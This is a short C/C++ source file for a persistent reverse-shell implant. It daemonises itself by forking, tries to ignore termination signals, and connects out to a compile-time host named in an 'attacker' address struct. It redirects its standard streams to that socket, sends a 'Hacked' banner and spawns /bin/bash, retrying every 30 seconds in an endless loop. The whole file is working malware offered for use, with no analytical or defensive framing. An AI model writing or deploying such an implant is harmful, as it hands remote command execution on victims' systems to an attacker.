
#include <stdlib.h>
#include <unistd.h>
#include <cstdio>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

void handleall(int sig){
   return;
}

char* GetHostByName(const char* dns){
   struct hostent* host=gethostbyname(dns);
   char *ipaddr=(char*)malloc(16);

   if (host==0x00)return 0x00;

   inet_ntop(AF_INET, host->h_addr, ipaddr, 16);

   return ipaddr;
}


struct sockaddr_in attacker={.sin_family=AF_INET,.sin_port=htons(PORT)};
int s, c;

int main(void){

  signal(SIGPIPE, handleall);
  signal(SIGINT , handleall);
  signal(SIGTERM, handleall);
  signal(SIGTRAP, handleall);
  signal(SIGHUP , handleall);
  signal(SIGSTOP, handleall);
  signal(SIGKILL, handleall);
  signal(SIGQUIT, handleall);

  if (fork()>0)exit(0);
  char* ip=GetHostByName(IP);
  inet_pton(AF_INET,ip,&attacker.sin_addr.s_addr);

code:
  s=socket(AF_INET, SOCK_STREAM,0);
  for (int fd=0;fd<3;fd++) { close(fd); dup2(s,fd);}

  do {c=connect(s,(struct sockaddr*)&attacker,sizeof(attacker)); sleep(30);}while(c==-1);
  send(s,"☢ Hacked !!Reverse Live Shell Opened !!\n", sizeof("☢ Hacked !!Reverse Live Shell Opened !!\n"),0);
  system("/bin/bash");
  close(s);
  goto code;
}

